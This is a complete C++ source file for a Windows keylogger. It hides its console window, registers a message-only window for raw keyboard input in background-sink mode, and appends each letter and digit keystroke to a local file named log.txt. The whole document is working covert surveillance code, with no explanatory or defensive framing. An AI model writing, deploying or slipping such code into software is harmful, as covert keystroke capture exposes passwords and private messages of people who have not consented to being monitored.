#define WINVER 0x0501
#include <windows.h>
#include <fstream>

HWND hWnd;
UINT dwSize;
RAWINPUTDEVICE rid;
PRAWINPUT d = NULL;
std::fstream f;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {

    case WM_CREATE:
        rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK | RIDEV_NOHOTKEYS;
        rid.usUsagePage = 1;
        rid.usUsage = 6;
        rid.hwndTarget = hWnd;
        RegisterRawInputDevices(&rid, 1, sizeof(rid));
        break;

    case WM_INPUT:
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == 0)
        {
            d = new RAWINPUT[dwSize];
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, d, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize)
            {
                if (d->data.keyboard.Message == WM_KEYDOWN || d->data.keyboard.Message == WM_SYSKEYDOWN)
                {
                    if ((d->data.keyboard.VKey >= 65 && d->data.keyboard.VKey <= 90) || (d->data.keyboard.VKey >= 48 && d->data.keyboard.VKey <= 57))
                    {
                        f.open("log.txt", std::ofstream::app);
                        f << char(d->data.keyboard.VKey) << "\n";
                        f.close();
                    }
                }
            }
            delete[] d;
        }
        break;

    default:
        return DefWindowProcA(hWnd, message, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    MSG msg = {};
    WNDCLASS wc = {};

    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "x";

    RegisterClassA(&wc);
    hWnd = CreateWindowExA(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

    while (GetMessageA(&msg, hWnd, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return msg.wParam;
}
